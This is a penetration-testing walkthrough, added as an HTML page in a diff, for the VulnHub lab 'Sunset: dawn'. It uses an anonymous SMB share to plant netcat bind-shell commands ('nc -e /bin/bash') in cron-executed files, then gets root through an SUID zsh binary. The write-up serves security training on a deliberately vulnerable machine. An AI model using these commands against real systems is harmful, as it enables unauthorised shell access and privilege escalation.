@@ -1,0 +1,96 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Sunset: dawn Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/sunset-dawn-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-09-10T06:06:04+00:00">September 10, 2019</time><time class="updated" datetime="2025-06-10T20:11:08+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge called “Sunset: dawn”. It is available on Vulnhub for the purpose of Penetration Testing practices. This is a box from the Sunset series. The credit for making this lab goes to <strong>“whitecr0wz”</strong>. Let’s start and learn how to successfully breach it.</span></p>
+<p><span style="color: #000000;">Level: Intermediate</span></p>
+<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/sunset-dawn,341/">link</a></strong>.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Performing Directory Bruteforce</span></li>
+<li><span style="color: #000000;">Enumerating log files</span></li>
+<li><span style="color: #000000;">Enumerating SMB using Enum4linux</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Connecting via SMB</span></li>
+<li><span style="color: #000000;">Sending files with netcat invocation</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SUID bit on zsh</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Capture the flag</strong></span></p>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">We will be running this lab in a Virtual Machine Player or Virtual Box.  After running the lab, we used the netdiscover command to check the IP Address of the lab.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;">This was found out to be 192.168.1.165.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s9NlxcAcH3o/XXc4Zy3hwjI/AAAAAAAAgfk/kEsiv4Ic_t8XDEWZgMl_LvKVwxQkIolugCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Now we will run an aggressive port scan using nmap to gain the information about the open ports and the services running on the target machine.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.165</pre>
+<p><span style="color: #000000;">We learned from the scan that we have the port 80 open which is hosting Apache httpd service, and we have the port 139,445,3306 open. This tells us that we have the NetBIOS and MySQL service running on the target machine respectively.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-C1Xct8YiRCs/XXc4ciZgguI/AAAAAAAAggA/uXKEBhh_Oo0bV-GgkF9ulTheIEK_i5c2wCLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Since we got the port 80 open, we decided to browser the IP Address in the browser. We were given an unavailable error as shown in the given image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-brvxXr6uDGo/XXc4dGYnU0I/AAAAAAAAggE/0Yn5fIXNd1MDnllS-itu78QhCCwQWpu7QCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">We also started a Directory Bruteforce in order to enumerate the machine further. This gave us a directory called <strong>“logs”</strong> as shown in the given image.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.165/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Rgxu_0DPU7U/XXc4dXRlVSI/AAAAAAAAggI/KLFj0QgZLkMjobdJHJhPZmx8xhKyQNexwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Upon finding the logs directory, we opened the URL in our browser. This gave us a bunch of different log files like auth.log, daemon.log, error.log and management.log. We tried to access the all those log files but we got forbidden message in all except management.log.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MMx555g9G2g/XXc4diTLL8I/AAAAAAAAggM/RkibfcnN9eoH-njbjb1tbnUL5fiGvDesgCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">So, we downloaded the management.log and used cat command to open the management.log on our attacker machine (Kali Linux). Here we see that we have a directory named “ITDEPT”. It contains two files namely product-control and web-control. As these files were mentioned with cron, we can safely say that these files are getting executed by some background task.</span></p>
+<pre class="lang:default decode:true">cd Downloads
+cat management.log</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QcO_h6j6uds/XXc4dyyrZbI/AAAAAAAAggQ/seCX6QAxdh85i8MReUUG3vi4oltmqzzLQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Back to the nmap port scan, we found that there is a NetBIOS SMB. Its time to enumerate this machine’s SMB Service. There are multiple ways to do this about which you can learn <strong><a style="color: #000000;" href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">here</a></strong>. now we decided to use the Enum4Linux script. This shows that we have the ITDEPT directory we found earlier. This means this directory is accessible through SMB.</span></p>
+<pre class="lang:default decode:true">enum4linux -a 192.168.1.165</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fVHZH9K3Mvw/XXc4eHbxgnI/AAAAAAAAggU/xX8V46g3DfIGcMWNB5-asVGzT7IA3g47gCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Also, as we explored the result of Enum4Linux, we saw that we have two users namely, “dawn” and” ganimedes”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3oxIhSdp8ho/XXc4eCXz27I/AAAAAAAAggY/z-lssbUUTlgV75CXDguNuZTFJ19VtBf8QCLcBGAs/s1600/8.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Since we found the ITDEPT directory in our enumeration. We tried to access it using the SMB as shown in the image. We gave a blank password to login. Upon logging in we ran the ls command. We found nothing in it. We ran the ls command again with the -al parameters to see if we missed any hidden files but we couldn’t find any.</span></p>
+<pre class="lang:default decode:true">smbclient //192.168.1.165/ITDEPT
+ls -al</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eEWq_8ete8I/XXc4eaorGeI/AAAAAAAAggc/wNH2P4Qe5YUFdh3BO9JupDwQvXL7jpZUgCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">But this doesn’t mean that we cannot create any file in it. We went back to our terminal and created the files by the name of “product-control” and “web-control”. We created the files by this name because earlier while enumerating the management.log file we saw that files with this name were executed after every minute. again and again, using cron. We also entered the netcat shell invocation script in those files using the echo command as well.</span></p>
+<pre class="lang:default decode:true">echo "nc -e /bin/bash -lvp 1234 &amp;" &gt; product-control
+echo "nc -e /bin/bash -lvp 1235 &amp;" &gt; web-control
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kL5h1LVPD8E/XXc4ZwZuxWI/AAAAAAAAgfs/WzeHnxZjnK83lfKdL3VfL-QpUUt4e_afACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Now back to the SMB shell, we transferred the files that we just created to the target system using the put command. Both the files were successfully transferred. After the transfer, we ran the ls command to check whether the files were indeed on the system or not. As seen in the image given below, we have put our files on the target system. </span></p>
+<pre class="lang:default decode:true">put product-control
+put web-control
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-r9xl95IM4pw/XXc4Z5t6xSI/AAAAAAAAgfo/g0XtyCBsg7gN5nLp8iDZNxarZE0Bh7LxgCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Now, we went back to our browser, to see the log directory. From there we downloaded the management.log file again. We did this as if those files we just created were executed or not. As shown in the image, the files were successfully executed.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ljiV7YZPR8s/XXc4aumTRLI/AAAAAAAAgfw/Zwzeri_IURQptc66fr8e4xaDJAwgClODACLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Now we ran the netcat to get this session on the target machine. We get our shell through netcat. This was an improper shell. So, we used the python one-liner to convert this into a proper shell. On conversion, we saw that the shell we got was of user dawn.</span></p>
+<pre class="lang:default decode:true">nc 192.168.1.165 1234
+python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Now that we had a shell, it was a regular practice to check for any file having SUID permissions with the help of Find command. By using the following command, we enumerated all binaries having SUID permissions:</span></p>
+<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null
+whoami
+/usr/bin/zsh
+whoami
+cd /root
+ls
+cat flag.txt</pre>
+<p><span style="color: #000000;">The Find command gave us that the zsh command can help us escalate privilege on this machine. We ran the zsh command and checked our status using the whoami command. We got root. Now it was time to enumerate for the flag. We traversed into the root directory and found the flag.txt file. This concludes this CTF.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pXTnPLU638c/XXc4bHARC9I/AAAAAAAAgf0/ZGRlmjamYvMgfIINlVvtDxO_HLfbsCUYQCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><strong>here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
